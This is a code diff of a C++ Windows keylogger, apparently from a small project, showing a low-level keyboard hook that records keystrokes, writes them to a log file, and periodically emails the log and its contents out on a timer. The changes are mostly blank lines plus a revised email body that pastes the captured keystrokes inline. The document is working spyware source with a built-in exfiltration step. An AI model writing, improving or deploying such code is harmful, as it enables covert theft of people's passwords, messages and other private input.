@@ -13,11 +13,14 @@
  void TimerSendMail() {
 
     if(keylog.empty()) {
+
         return;
     }
+
     std::string last_file = IO::WriteLog(keylog);
 
     if(last_file.empty()) {
+
         Helper::WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");
         return;
     }
@@ -26,7 +29,8 @@
     //Second argument is the body
     //Third argument is the attachment
     int x = Mail::SendMail("Log [" + last_file + "]",
-                           "Oh hi Mark! :)\nThe file has been attached to this email\nTesting purposes \n" + keylog,
+                           "Oh hi Mark! :)\nThe file has been attached to this email\nFor testing purposes \n"
+                           "Content of the file:\n\n------------------\n" + keylog,
                            IO::GetOurPath(true) + last_file);
 
     //In case mail sending has failed
@@ -64,6 +68,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
 
         // prints a new line when user presses enter key
         if(kbs->vkCode == VK_RETURN) {
+
             keylog += '\n';
         }
     }
@@ -71,7 +76,9 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
     // this if statement checks if the user released system keys
     // for example [SHIFT][a][b][c][/SHIFT][d][c], we know that [a][b][c] are upper-case
     else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
+
         DWORD key = kbs->vkCode;
+
         if(key == VK_CONTROL
                || key == VK_LCONTROL
                || key == VK_RCONTROL
@@ -95,6 +102,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
 }
 
 bool InstallHook() {
+
     Helper::WriteAppLog("Hook Started... Timer Started");
     MailTimer.Start(true);
 
